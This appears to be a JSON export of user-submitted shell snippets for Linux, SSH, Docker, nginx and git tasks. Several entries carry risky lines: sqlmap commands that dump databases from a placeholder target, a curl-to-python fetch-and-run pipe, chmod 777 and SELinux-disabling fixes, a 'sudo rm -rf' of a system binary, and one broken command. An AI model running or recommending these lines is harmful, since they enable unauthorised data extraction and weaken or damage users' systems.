    "description": "# speed up video and audio at the same time # 2x speed up command: ffmpeg -i input.mkv -filter_complex \"[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]\" -map \"[v]\" -map \"[a]\" output.mkv # 1.5x speed up command: ffmpeg -i input.mkv -filter_complex \"[0:v]setpts=0.666*PTS[v];[0:a]atempo=1.5[a]\" -map \"[v]\" -map \"[a]\" output.mkv # speed up formula (x must be between 0 and 2): ffmpeg -i input.mkv -filter_complex \"[0:v]setpts=<1/x>*PTS[v];[0:a]atempo=<x>[a]\" -map \"[v]\" -map \"[a]\" output.mkv\n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4370,
    "keyword": null,
    "link": null,
    "title": " speedtest python oneliner",
    "description": "curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python - \n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4371,
    "keyword": null,
    "link": null,
    "title": " spigot start.bat",
    "description": "@echo off title Server Console java -Xmx1G -jar ServerFile.jar PAUSE\n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4372,
    "keyword": null,
    "link": null,
    "title": " split and get last",
    "description": "Use rev command altogether with cut command as follows: echo \"a1 a2 a3 a4 a5\" | rev | cut -d ' ' -f '1' | rev #rev reverses string, then you cut from 2th field to end and reverse back\n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4373,
    "keyword": null,
    "link": null,
    "title": " split screen into 4 ubuntu",
    "description": "sudo apt-get install compizconfig-settings-manager \n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4374,
    "keyword": null,
    "link": null,
    "title": " spotify download ubuntu",
    "description": "#On ubuntu can just type following command: snap install spotify #if that not works you can also try to install the debian package #you will need for this 'curl' so install that first sudo apt install curl #after installing curl or you already have installed curl you shuld run this command curl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add - #and also echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list #after that get update sudo apt-get update #and also the upgrade sudo apt-get upgrade #now install spotify client sudo apt-get install spotify-client #now you can open spotify #users with 4k monitor i recement to scale the app up #else it will be very hard to read the text #open for that again the terminal #open directory /usr/share/applications/ cd /usr/share/applications/ #open spotify.desktop file with sudo sudo gedit spotify.desktop #now change the line Exec=spotify %U #to: Exec=spotify --force-device-scale-factor=2.0 %U #and safe the file #this will scale spotify for 2x while starting #now you can close everything and open spotify\ncurl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add -  echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list sudo apt-get update && sudo apt-get install spotify-client\ncurl -sS https://download.spotify.com/debian/pubkey.gpg | sudo apt-key add -  echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list sudo apt-get update && sudo apt-get install spotify-client\ncurl -sS https://download.spotify.com/debian/pubkey_0D811D58.gpg | sudo apt-key add - echo \"deb http://repository.spotify.com stable non-free\" | sudo tee /etc/apt/sources.list.d/spotify.list\n",
    "reg_date": "2021-10-11T22:11:57.000Z"
  },
  {
    "id": 4375,
    "keyword": null,
    "link": null,
    "title": " sqlite3 attempt to write a readonly database",
    "description": "//do the follow chown www-data /myproject chown www-data /myproject/db.sqlite3 chmod 777 /myproject/db.sqlite3\n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4376,
    "keyword": null,
    "link": null,
    "title": " sqlite3 install ubuntu",
    "description": "sudo apt update sudo apt install sqlite3 sqlite3 --version sudo apt install sqlitebrowser \nsudo apt update sudo apt install sqlite3 sqlite3 --version sudo apt install sqlitebrowser\nsudo apt update sudo apt install sqlite3 # this will install sqlite sudo apt install squlitebrowser # its just like MySQL Workbench \n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4377,
    "keyword": null,
    "link": null,
    "title": " sqlmap enumerate databases",
    "description": "sqlmap -u \"http://vulnerableparametersinurl.com?id=1\" --dbs --dump\nsqlmap -u \"http://vulnerableparametersinurl.com?id=1\" -d site_database --tables --dump\n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4378,
    "keyword": null,
    "link": null,
    "title": " sqlmap enumerate tables in databases",
    "description": "sqlmap -u \"http://vulnerableparametersinurl.com?id=1\" -d site_database --tables --dump\nsqlmap -u \"http://vulnerableparametersinurl.com?id=1\" --dbs --dump\n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4379,
    "keyword": null,
    "link": null,
    "title": " ssh-add could not open a connection to your authentication agent centos",
    "description": "##1 $ cd ~/.ssh ##2 #ubuntu $ eval $(ssh-agent) #CentOS $ exec ssh-agent bash ##3 $ ssh-add my_id_rsa \n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4380,
    "keyword": null,
    "link": null,
    "title": " ssh-copy-id",
    "description": "ssh-copy-id -i ~/.ssh/mykey.pub user@host\nssh-copy-id root@<host-ip>\nssh-copy-id -i ~/.ssh/mykey user@host\nssh-copy-id -i ~/.ssh/your_key.pub root@123.456.789\nssh-copy-id user@hostname.example.com \n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4381,
    "keyword": null,
    "link": null,
    "title": " ssh-copy-id windows",
    "description": "type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh {IP-ADDRESS-OR-FQDN} \"cat >> .ssh/authorized_keys\" \nssh-copy-id root@<host-ip>\nssh-copy-id -i ~/.ssh/your_key.pub root@123.456.789\nssh-copy-id user@hostname.example.com \n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4382,
    "keyword": null,
    "link": null,
    "title": " ssh-copy-id windows10",
    "description": "type $env:USERPROFILE\\.ssh\\id_rsa.pub | ssh {IP-ADDRESS-OR-FQDN} \"cat >> .ssh/authorized_keys\" \n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4383,
    "keyword": null,
    "link": null,
    "title": " ssh-key gen git",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:11:58.000Z"
  },
  {
    "id": 4384,
    "keyword": null,
    "link": null,
    "title": " ssh-keygen and ssh-copy-id",
    "description": "ssh-copy-id -i ~/.ssh/mykey user@host\n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4385,
    "keyword": null,
    "link": null,
    "title": " ssh-keygen rsa",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -b 8192\ncd ~/.ssh\n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4386,
    "keyword": null,
    "link": null,
    "title": " ssh connect to host bitbucket.org port 22: Connection timed out",
    "description": "Use your favorite terminal vim ~/.ssh/config  Add these lines and save it.  Host bitbucket.org Hostname  altssh.bitbucket.org Port  443\n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4387,
    "keyword": null,
    "link": null,
    "title": " ssh delete folder",
    "description": "rm -rf foldername/\n700 on the .ssh directory 600 on the authorized_keys file. \n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4388,
    "keyword": null,
    "link": null,
    "title": " ssh generate key",
    "description": "eval `ssh-agent`\n$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\n ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n$ ssh-keygen -t ed25519 -C \"your_email@example.com\"\n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4389,
    "keyword": null,
    "link": null,
    "title": " ssh get key",
    "description": "cat ~/.ssh/id_rsa.pub  # or  cat ~/.ssh/id_dsa.pub\ncat ~/.ssh/id_ed25519.pub\n# see SSH key List ~/.ssh # see public key from existing file cat ~/ssh/<filename>.pub\nssh-agent sh -c 'ssh-add; ssh-add -L'\n",
    "reg_date": "2021-10-11T22:11:59.000Z"
  },
  {
    "id": 4390,
    "keyword": null,
    "link": null,
    "title": " ssh github generate key",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\n### ADD SSH key to Github  ###  # Check if you have a key? ssh-add -l  # If not? then follow steps to generate key ssh-keygen -t rsa -b 4096 -C your__gmail  # Now for copy the key use xclip tool or just goto file and copy sudo apt install xclip xclip -sel clip < ~/.ssh/id_rsa.pub  # Now goto github.com and goto settings  # select  SSH and GPG keys # New SSH key # Enter \"your__choice__name\" in title field... # Paste your public key into the Key field # Click Add SSH key  DONE!!!     \n$ ssh-add ~/.ssh/id_ed25519\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4391,
    "keyword": null,
    "link": null,
    "title": " ssh into ec2 from ubuntu",
    "description": "sudo chmod 400 ec2.pem ssh -i ec2.pem ubuntu@ec2-23-22-122-111.compute-1.amazonaws.com\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4392,
    "keyword": null,
    "link": null,
    "title": " ssh key git",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nGenerate SSH Key: $ ssh-keygen -t rsa -C \"email@example.com\"  Add public key to git: $ cat ~/.ssh/id_rsa.pub (copy all) - Open web browser and paste the output on the client settings you use.  Start SSH agent: $ eval \"$(ssh-agent -s)\"  Add private key to SSH agent: $ ssh-add ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4393,
    "keyword": null,
    "link": null,
    "title": " ssh key mac",
    "description": "ssh-keygen -t rsa  //copy to clipboard pbcopy < ~/.ssh/id_rsa.pub\n$ ls -al ~/.ssh # Lists the files in your .ssh directory, if they exist\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4394,
    "keyword": null,
    "link": null,
    "title": " ssh login windows",
    "description": "ssh <username>@<host>\nssh [username]@[ip]\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4395,
    "keyword": null,
    "link": null,
    "title": " ssh open tunnel command line",
    "description": "# from localhost:13306 to remote 3306 via tunnel ssh -L 33066:localhost:3306 remotemachine\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4396,
    "keyword": null,
    "link": null,
    "title": " ssh operation timed out mac",
    "description": "$ ping server_address $ traceroute server_address $ ssh -v login_name@server_address # Please check that you are connecting # to your targeted server with the right network interface.  # If you suspect a legitimate or accidental filtering, # you will be able to diagnose it with:  $ nmap -Pn -p22 server_address\n",
    "reg_date": "2021-10-11T22:12:00.000Z"
  },
  {
    "id": 4397,
    "keyword": null,
    "link": null,
    "title": " ssh pc without password ubuntu",
    "description": "# run on local pc  sudo apt-get update sudo apt-get -y install openssh-server  sudo systemctl start ssh  ssh-keygen -t rsa  ssh-copy-id your_username@your_server-IP \n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4398,
    "keyword": null,
    "link": null,
    "title": " ssh permissions too open",
    "description": "chmod 600 ~/.ssh/id_rsa\n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4399,
    "keyword": null,
    "link": null,
    "title": " ssh remove known hosts entry",
    "description": "ssh-keygen -R \"hostname\" \n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4400,
    "keyword": null,
    "link": null,
    "title": " ssh restart ubuntu",
    "description": "sudo service ssh restart\n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4401,
    "keyword": null,
    "link": null,
    "title": " ssh run single command",
    "description": "ssh -t username@host 'top'\n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4402,
    "keyword": null,
    "link": null,
    "title": " ssh scp",
    "description": "# download: remote -> local scp user@remote_host:remote_file local_file   # upload: local -> remote scp local_file user@remote_host:remote_file\nscp ./file.txt remote_username@remote_ip:/remote/directory\nscp -i ~/.ssh/id_rsa.pub FILENAME USER@SERVER:/home/USER/FILENAME\nscp /users/Edward/desktop root@191.162.0.2:/writing/article\ndragonmnl@local $ scp -P 2222 file.ext username@domain:~/  \n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4403,
    "keyword": null,
    "link": null,
    "title": " sshpass example scp",
    "description": "sshpass -p 'password' scp file.tar.gz root@xxx.xxx.xxx.194:/backup \n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4404,
    "keyword": null,
    "link": null,
    "title": " sshpass mac os x brew",
    "description": "brew install https://raw.githubusercontent.com/kadwanev/bigboybrew/master/Library/Formula/sshpass.rb\n",
    "reg_date": "2021-10-11T22:12:01.000Z"
  },
  {
    "id": 4405,
    "keyword": null,
    "link": null,
    "title": " ssl security check ats",
    "description": "nscurl --ats-diagnostics https://yourdomain --verbose\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4406,
    "keyword": null,
    "link": null,
    "title": " stacer download ubuntu",
    "description": "sudo add-apt-repository ppa:oguzhaninan/stacer\nsudo apt-get update -y sudo apt-get upgrade -y wget https://jaist.dl.sourceforge.net/project/stacer/v1.0.9/stacer_1.0.9_amd64.deb sudo dpkg -i stacer_1.0.9_amd64.deb\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4407,
    "keyword": null,
    "link": null,
    "title": " stacer ubuntu",
    "description": "sudo add-apt-repository ppa:oguzhaninan/stacer\nsudo apt-get update -y sudo apt-get upgrade -y wget https://jaist.dl.sourceforge.net/project/stacer/v1.0.9/stacer_1.0.9_amd64.deb sudo dpkg -i stacer_1.0.9_amd64.deb\n# Ubuntu 16.04 LTS upwards sudo add-apt-repository ppa:oguzhaninan/stacer sudo apt update sudo apt install stacer  # To run in command line stacer\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4408,
    "keyword": null,
    "link": null,
    "title": " start apache2 ubuntu",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\nsudo apt-get --purge remove apache2 sudo apt-get autoremove sudo apt-get install apache2 sudo /etc/init.d/apache2 restart\n# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4409,
    "keyword": null,
    "link": null,
    "title": " start apache service",
    "description": "# Start Apache 2 server on Linux/Unix sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\nsystemctl status apache2\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4410,
    "keyword": null,
    "link": null,
    "title": " start docker service on windows",
    "description": "net start com.docker.service net stop com.docker.service\nsystemctl start docker.service #(OR) systemctl start docker # it will start docker\nsudo systemctl start docker service sudo systemctl stop docker service\n# start another docker machine  # create a new docker machine docker-machine create -d virtualbox --virtualbox-memory 2048 --virtualbox-disk-size 204800 my_new_machine  # replace my_new_machine docker-machine start my_new_container eval $($DOCKER_MACHINE env my_new_container --shell=bash) docker-machine ssh my_new_container\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4411,
    "keyword": null,
    "link": null,
    "title": " start jupyter notebook from terminal",
    "description": "jupyter notebook\npython -m notebook\n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4412,
    "keyword": null,
    "link": null,
    "title": " start mariadb on linux terminal",
    "description": "sudo systemctl start mariadb \nsudo systemctl restart mariadb \n",
    "reg_date": "2021-10-11T22:12:02.000Z"
  },
  {
    "id": 4413,
    "keyword": null,
    "link": null,
    "title": " start mongodb",
    "description": "sudo systemctl restart mongodb # it will restarts running mongodb server\nsudo systemctl start mongod \nsudo systemctl start mongod sudo systemctl stop mongod\nsudo systemctl start mongodb\nStart a terminal for your mongo server Go to <mongodb-install-directory>/bin directory Run the command./mongod Start a terminal for your mongo shell Go to <mongodb-install-directory>/bin directory Run the command (make sure you put the name of the database)./mongo test\nmongod --dbpath <file_path> --port <port>\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4414,
    "keyword": null,
    "link": null,
    "title": " start mongodb service ubuntu",
    "description": "sudo apt update sudo apt install -y mongodb //checking service and db sudo systemctl status mongodb or service mongodb status //start service sudo systemctl start mongod or service mongodb start //stop service sudo systemctl stop mongod  or service mongodb stop \nsudo systemctl start mongod sudo systemctl stop mongod\n sudo systemctl start mongodb # it will starts mongodb server\nsudo mongod --fork --config /etc/mongod.conf\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4415,
    "keyword": null,
    "link": null,
    "title": " start multiple bash processes and wait for all to complete",
    "description": "#!/bin/bash  FAIL=0  echo \"starting\"  ./sleeper 2 0 & ./sleeper 2 1 & ./sleeper 3 0 & ./sleeper 2 0 &  for job in `jobs -p` do echo $job     wait $job || let \"FAIL+=1\" done  echo $FAIL  if [ \"$FAIL\" == \"0\" ]; then echo \"YAY!\" else echo \"FAIL! ($FAIL)\" fi\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4416,
    "keyword": null,
    "link": null,
    "title": " start react native app",
    "description": "react-native run-android  react-native run-ios\nnpm install -g expo-cli \n$ npm i -g create-react-native-app $ create-react-native-app my-project $ cd my-project $ npm start \n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4417,
    "keyword": null,
    "link": null,
    "title": " start redis server",
    "description": "$ redis-cli ping PONG \n$ redis-server\nsudo /etc/init.d/redis_6379 start \nsudo systemctl restart redis.service \nredis-cli \nbrew install redis\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4418,
    "keyword": null,
    "link": null,
    "title": " start service docker on linux",
    "description": "systemctl start docker.service #(OR) systemctl start docker # it will start docker\nsudo systemctl start docker service sudo systemctl stop docker service\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4419,
    "keyword": null,
    "link": null,
    "title": " start ubuntu hotspot from terminal",
    "description": "nmcli connection up Hotspot\n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4420,
    "keyword": null,
    "link": null,
    "title": " starting apacha fail",
    "description": "sudo /etc/init.d/apache2 stop sudo /opt/lampp/lampp start \n",
    "reg_date": "2021-10-11T22:12:03.000Z"
  },
  {
    "id": 4421,
    "keyword": null,
    "link": null,
    "title": " stash with message",
    "description": "git stash save &ldquo;Your stash message&rdquo;.\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4422,
    "keyword": null,
    "link": null,
    "title": " stash with new files",
    "description": "git stash --include-untracked \n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4423,
    "keyword": null,
    "link": null,
    "title": " steam is not in the sudoers file.",
    "description": "1. \tOpen sudoers file using command : sudo nano /etc/sudoers  2. \tThen add  \t\"YourUsername ALL=(ALL)  ALL\"  \tbelow the root user\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4424,
    "keyword": null,
    "link": null,
    "title": " stop a process running on a port",
    "description": "taskkill /F /PID PORT_NUMBER\n# Print PID of process bound on that port. fuser 8080/tcp  # Kill that process fuser -k 8080/tcp\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4425,
    "keyword": null,
    "link": null,
    "title": " stop a process running on a port ubuntu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001` \nsudo kill -9 `sudo lsof -t -i:9001`\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4426,
    "keyword": null,
    "link": null,
    "title": " stop all container in docker",
    "description": "docker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker stop <Container_Name> Example:$ docker stop de150daf2910 \n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4427,
    "keyword": null,
    "link": null,
    "title": " stop all docker ps-a",
    "description": "docker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4428,
    "keyword": null,
    "link": null,
    "title": " stop apache server",
    "description": "# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop\n# On Ubuntu ## Start command ## systemctl start apache2.service ## Stop command ## systemctl stop apache2.service ## Restart command ## systemctl restart apache2.service\n# Restart Apache 2 server on Linux/Unix sudo service apache2 restart  # Start Apache 2 server on Linux/Unix sudo service apache2 start  # Stop Apache 2 server on Linux/Unix sudo service apache2 stop  # Reload Apache 2 server on Linux/Unix \"No downtime!\" sudo service apache2 reload\n #how to start a web server linux  sudo service apache2 start\n# how to stop a web server linux sudo service apache2 stop\n",
    "reg_date": "2021-10-11T22:12:04.000Z"
  },
  {
    "id": 4429,
    "keyword": null,
    "link": null,
    "title": " stop docker container",
    "description": "docker stop $(docker ps -a -q) docker rm $(docker ps -a -q)\ndocker stop $(docker ps -a -q)\n//Check if the container is running docker ps -a  docker container stop {container-id}\nsystemctl stop docker.service #(OR) systemctl stop docker # it will start docker\ndocker ps --filter \"status=exited\" \ndocker container stop [CONTAINER]\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4430,
    "keyword": null,
    "link": null,
    "title": " stop git",
    "description": "You can use one of the following commands to stop git.  1. rm -R .git/ 2. -rf .git/\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4431,
    "keyword": null,
    "link": null,
    "title": " stop google process linux",
    "description": "sudo killall chromedriver sudo killall chrome\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4432,
    "keyword": null,
    "link": null,
    "title": " stop localhost server",
    "description": "netstat -ano | findstr :yourPortNumber tskill typeyourPIDhere \n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4433,
    "keyword": null,
    "link": null,
    "title": " stop nginx",
    "description": "sudo systemctl stop nginx\nsudo service nginx restart\nsudo systemctl start nginx\nnginx -s stop\n# stops nginx sudo systemctl stop nginx  # starts nginx sudo systemctl start nginx\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4434,
    "keyword": null,
    "link": null,
    "title": " stop nginx mac",
    "description": "brew services stop nginx\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4435,
    "keyword": null,
    "link": null,
    "title": " stop nginx server",
    "description": "sudo systemctl stop nginx\nsudo service nginx restart\nsudo systemctl reload nginx\nsudo systemctl start nginx\nsystemctl reload nginx \nnginx -s stop\n",
    "reg_date": "2021-10-11T22:12:05.000Z"
  },
  {
    "id": 4436,
    "keyword": null,
    "link": null,
    "title": " stop nginx ubuntu",
    "description": "sudo systemctl start nginx  sudo systemctl stop nginx  sudo systemctl restart nginx   sudo service nginx start sudo service nginx stop sudo service nginx restart  \nsystemctl reload nginx \n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4437,
    "keyword": null,
    "link": null,
    "title": " stop port 3000 mac",
    "description": "sudo lsof -i :3000 kill -9 PID\nsudo lsof -i tcp:3000  \nsudo lsof -i :3000 \nlsof -n -i TCP:8080 COMMAND   PID   USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME node     54762   user   23u  IPv4 XXXXXXXXX      0t0  TCP 127.0.0.1:http-alt (LISTEN) PID // is second field in the response . Then, kill that process:  kill -9 54762 // here put PID number found on the table 54762\nkill $(lsof -ti:3000,3001,8080)\n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4438,
    "keyword": null,
    "link": null,
    "title": " stop port ubintu",
    "description": "sudo kill -9 `sudo lsof -t -i:9001`\nfuser -n tcp -k 9001  \n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4439,
    "keyword": null,
    "link": null,
    "title": " stop task on port",
    "description": "netstat -ano | findstr :3001 taskkill /PID <yourid> /F\nnpx kill-port 8080 \n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4440,
    "keyword": null,
    "link": null,
    "title": " stop tomcat from terminal mac",
    "description": "kill -9 $(lsof -t -i:8080)\n$ netstat -an | grep 8080\n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4441,
    "keyword": null,
    "link": null,
    "title": " storage/logs/laravel.log\" could not be opened: failed to open stream: Permission denied",
    "description": "$ chmod -R 775 storage bootstrap/cache \n chmod 777 -R storage bootstrap/cache\n# setenforce 0 \nReference link if giving a permission doesn't solved your issue https://www.digitalocean.com/community/questions/the-stream-or-file-var-www-html-myscipt-storage-logs-laravel-log-could-not-be-opened-failed-to-open-stream-permission-denied\n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4442,
    "keyword": null,
    "link": null,
    "title": " store git credentials",
    "description": "// local git config credential.helper store // global git config --global credential.helper store\n$ git config --global credential.helper store\n# this will store your credentials \"forever\" git config --global credential.helper store\n# This cache timeout is in seconds $ git config --global credential.helper 'cache --timeout=3600'  \nTo store the token git credential so that you don't have to type token everytime, use this command before pushing. git cofig credential.helper store\n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4443,
    "keyword": null,
    "link": null,
    "title": " styled components props typescript",
    "description": "# to prevent typescript error, install this yarn add @types/styled-components  # NPM npm install @types/styled-components\ninterface YourProps {   invalid: boolean }  const Input = styled.input`   border: ${(p: YourProps) => p.invalid ? 'red' : 'blue'}; ` \n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4444,
    "keyword": null,
    "link": null,
    "title": " styled componets npm",
    "description": "npm i styled-components\nimport styled from 'styled-component';  // Create a Title component that'll render an <h1> tag with some styles const Title = styled.h1`   font-size: 1.5em;   text-align: center;   color: palevioletred; `;  // Create a Wrapper component that'll render a <section> tag with some styles const Wrapper = styled.section`   padding: 4em;   background: papayawhip; `;  // Use Title and Wrapper like any other React component &ndash; except they're styled! render(   <Wrapper>     <Title>       Hello World!     </Title>   </Wrapper> );\n",
    "reg_date": "2021-10-11T22:12:06.000Z"
  },
  {
    "id": 4445,
    "keyword": null,
    "link": null,
    "title": " stylelint fix",
    "description": "npx stylelint --fix \"**/*.css\"\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4446,
    "keyword": null,
    "link": null,
    "title": " stylelint run",
    "description": "npx stylelint \"**/*.css\"\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4447,
    "keyword": null,
    "link": null,
    "title": " sublime text ctrl + v is and c is not working",
    "description": "Try to erase the content surrounded by [ ] in the file &ldquo;Default (Windows).sublime-keymap&rdquo; in the foider  &ldquo;AppData\\Roaming\\Sublime Text 3\\Packages\\User\\User&rdquo; It works for me\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4448,
    "keyword": null,
    "link": null,
    "title": " sublime text download ubuntu",
    "description": "wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -  echo \"deb https://download.sublimetext.com/ apt/stable/\" | sudo tee /etc/apt/sources.list.d/sublime-text.list sudo apt update && sudo apt install sublime-text\nwget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add - \nsudo apt-get install apt-transport-https \n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4449,
    "keyword": null,
    "link": null,
    "title": " subprocess.CalledProcessError: Command '('lsb release', '-a')' returned non-zero exit status 1.",
    "description": "sudo rm -rf /usr/bin/lsb_release \n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4450,
    "keyword": null,
    "link": null,
    "title": " sudo: /usr/local/bin/sudo must be owned by uid 0 and have the setuid bit set",
    "description": "mount -o remount,rw /  mount --all  chown root:root /usr/bin/sudo  chmod 4755 /usr/bin/sudo  restart \n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4451,
    "keyword": null,
    "link": null,
    "title": " sudo: traceroute: command not found",
    "description": "sudo apt-get install traceroute\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4452,
    "keyword": null,
    "link": null,
    "title": " sudo: ufw: command not found",
    "description": "sudo apt-get install ufw\nIf apt is not found so Linux is CentOS which is RedHat-based RedHat installs use yum not apt-get\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4453,
    "keyword": null,
    "link": null,
    "title": " sudo: unzip: command not found",
    "description": "sudo apt-get install unzip\n",
    "reg_date": "2021-10-11T22:12:07.000Z"
  },
  {
    "id": 4454,
    "keyword": null,
    "link": null,
    "title": " sudo apt-get update",
    "description": "sudo apt-get update && sudo apt-get -y upgrade \nsudo apt-get update sudo apt-get install curl\nsudo apt-get update sudo apt install python3-tk\nsudo apt-get update && sudo apt-get upgrade\n# \"To update Linux type:\" sudo apt-get update # Enter your user's password.\nsudo apt-get update -y && sudo apt-get upgrade -y  easy ;)\n",
    "reg_date": "2021-10-11T22:12:08.000Z"
  },
  {
    "id": 4455,
    "keyword": null,
    "link": null,
    "title": " sudo apt build-essential",
    "description": "sudo apt-get install build-essential \n",
    "reg_date": "2021-10-11T22:12:08.000Z"
